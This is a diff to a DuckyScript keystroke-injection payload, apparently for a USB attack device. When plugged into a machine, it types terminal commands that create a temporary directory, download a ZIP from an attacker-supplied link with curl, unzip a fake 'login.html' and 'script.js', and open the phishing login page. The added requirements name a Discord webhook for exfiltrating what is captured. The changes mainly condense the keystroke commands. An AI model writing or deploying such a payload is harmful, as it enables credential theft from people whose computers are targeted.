@@ -10,10 +10,14 @@ REM #############################################
 
 REM Requirements:
 REM     - Internet Connection
+REM     - You own ZIP link
+REM     - Discord webhook (or whatever you want to use for the exfiltration)
+REM     - Python
+REM     - 'ExecutionPolicy Bypass' if used in Windows 10/11
 
 
 REM REQUIRED - Replace example.com/file.zip with your own ZIP link. The zip should contian the files ['login.html', 'script.js']
-DEFINE ZIP_LINK example.com/file.zip
+DEFINE #ZIP_LINK example.com/file.zip
 
 
 DELAY 1000
@@ -23,34 +27,25 @@ DELAY 2000
 
 REM #### Main SECTION ####
 
-
 REM Create a random directory
-STRING dir_name=$(mktemp -d)
-ENTER
+STRINGLN dir_name=$(mktemp -d)
 DELAY 500
 
 REM Delete the directory after 60 minutes (3600 seconds)
-STRING (sleep 3600 && rm -rf $dir_name) &
-ENTER
+STRINGLN (sleep 3600 && rm -rf $dir_name) &
 DELAY 500
 
 REM Move into the directory
-STRING cd $dir_name
-ENTER
+STRINGLN cd $dir_name
 DELAY 500
 
-REM Downloa the zip from your own link
-STRING curl -LOk "
-STRING ZIP_LINK
-STRING "
-ENTER
+REM Download the zip from your own link
+STRINGLN curl -LOk "#ZIP_LINK"
 DELAY 500
 
 REM Unzip it
-STRING unzip file.zip
-ENTER
+STRINGLN unzip file.zip
 DELAY 500
 
 REM Open the login page
-STRING xdg-open login.html; exit;
-ENTER
+STRINGLN xdg-open login.html; exit;
